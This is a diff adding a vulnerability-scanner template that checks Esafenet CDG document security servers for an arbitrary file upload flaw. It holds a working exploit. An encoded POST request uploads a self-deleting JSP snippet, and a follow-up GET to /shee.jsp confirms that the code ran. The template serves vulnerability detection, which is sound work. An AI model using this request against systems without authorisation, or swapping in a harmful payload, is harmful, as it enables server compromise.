@@ -1,0 +1,30 @@
+id: cdg-uploadfilefromclientserviceforclient-file-upload
+
+info:
+  name: cdg-uploadfilefromclientserviceforclient-file-upload
+  author: SleepingBag945
+  severity: critical
+  description: 亿赛通电子文档安全系统 UploadFileFromClientServiceForClient接口 任意文件上传
+  tags: cdg
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/UploadFileFromClientServiceForClient?a=AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGEFOFMFLBDFAGOGM HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+        <% out.println("{{randstr_1}}");new
+        java.io.File(application.getRealPath(request.getServletPath())).delete();
+        %>
+      
+      - |
+        GET /shee.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200 && contains(body_2,"{{randstr_1}}")
+        condition: and
